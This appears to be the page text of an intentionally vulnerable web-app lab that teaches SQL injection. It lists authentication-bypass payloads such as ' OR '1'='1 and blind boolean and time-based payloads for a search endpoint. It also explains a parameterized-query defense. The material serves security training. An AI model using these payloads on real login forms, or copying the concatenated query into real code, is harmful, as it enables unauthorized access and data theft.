Attack Lab — Authentication Bypass

The login query uses string concatenation. Inject into the username or password field:

Vulnerable query template:

SELECT * FROM users WHERE username = '{username}' AND password = '{password}'

Payloads — click to copy:

  • ' OR '1'='1
  • admin' --
  • ' OR 1=1 --
  • admin'/*

Try: Username = ' OR '1'='1, Password = anything
→ Logs in as the first user in the DB (admin).

Defense: Enable SECURE_MODE = True in config.py — queries become parameterized and injection fails.

Blind SQL Injection — Search Endpoint

Use the search page to test boolean/time-based blind injection:

  • iPhone' AND 1=1 --
  • iPhone' AND 1=2 --
  • iPhone' AND randomblob(100000000) --

Defense Active — Secure Mode

In Secure Mode the login query uses a parameterized statement — user input is never concatenated into SQL:

SELECT * FROM users WHERE username = ? -- Input bound as a value, not executable code

All injection payloads above will fail. The ' character is treated as data, not SQL syntax.
